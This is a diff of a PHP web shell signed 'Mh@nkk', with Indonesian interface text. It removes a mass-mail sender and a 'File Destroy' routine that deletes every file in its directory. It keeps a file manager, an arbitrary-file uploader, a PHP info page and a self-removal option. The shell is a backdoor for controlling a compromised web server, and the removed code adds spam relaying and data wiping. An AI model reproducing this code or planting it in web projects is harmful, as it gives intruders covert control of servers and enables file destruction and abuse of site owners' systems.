@@ -25,16 +25,12 @@ session_regenerate_id(true);
 #[dir]: <?php echo getcwd(); ?>\<?php $current_file_name = basename($_SERVER['PHP_SELF']);
 echo $current_file_name . "
 "; ?><br><br>+------------------------+[ Mh@nkk ]+------------------------+</div><br>
-<img src="https://1.bp.blogspot.com/-ha3hqk1FS9w/XYRtZPyyofI/AAAAAAAAASo/ynpaUw_nNFERbwZGVWXXA4zFJm91gjGUQCLcBGAsYHQ/s320/Shinobu%2BKoucho2.png"style="width: 230px; left:0px;top:2px;position:absolute;" />
-<img src="https://1.bp.blogspot.com/-7mkmbatW1RM/XYRtZLvuVeI/AAAAAAAAASs/ZlxAXKP5oWAvNxY-bxXaL1fTVJxxBGADACLcBGAsYHQ/s320/Shinobu%2BKoucho.png" style="width: 200px; left:1040px;top:16px;position:absolute;">
 <!--End Header-->
 <!--Menu-->
 <font><center>
     <a href="?file_manager" class="cus">File Manager</a>
     <a href="?uploader" class="cus">Uploader</a>
-    <a href="?mailer" class="cus">Mailer</a>
     <a href="?phpinfo" class="cus">PHP Info</a>
-    <a href="?delete" class="cus" onclick="return  confirm('Hapus semua files?')">File Destroy</a>
     <a href="?die" class="cus" onclick="return  confirm('Mau Pergi?')">Self Remove</a>
 </center></font><br><br><br><br>
 <!--//End Menu-->
@@ -61,34 +57,6 @@ if(isset($_POST['upload'])) {
             echo "sukses upload <b>$files</b> di folder ini";}
         else {echo "gagal upload";}}} ?>
 <!--//End Uploader -->
-
-<!--//Mailer-->
-<?php if(isset($_GET['mailer'])){
-echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><br><label  for="tujuan">For :</label><input  type="text" id="tujuan" name="tujuan" placeholder="kim@mail.com"/><br><label  for="subjek">Subject :</label><input  type="text" id="subjek" name="subjek"/><br><textarea name="pesan" id="pesan" rows="10" cols="30">Message</textarea><input type="hidden" name="send"><br><button id="Send">Send</button></form></center>';}?>
-<?php if(@isset($_POST['send'])){
-    ini_set( 'display_errors', 1 );   
-    error_reporting( E_ALL );    
-    $from    = 'mh@nkk';    
-    $to      = $_POST['tujuan'];
-    $subject = $_POST['subjek'];
-    $message = $_POST['pesan'];   
-    $headers = "From:" . $from;    
-    mail($to,$subject,$message, $headers);    
-    echo "Pesan email sudah terkirim ke ".$to."";}?>
-<!--//End Mailer-->
-
-<!--//File Destroy-->
-
-<?php 
-if (isset($_GET['delete'])) {
-$files = scandir(__DIR__);
-    foreach($files as $file){ // iterate files
-        if(is_file($file))
-        unlink($file);
-    } 
-    echo "All Files Deleted";
-}?>
-<!--//End File Destroy-->
 
 <!--//Self Remove-->
 <?php
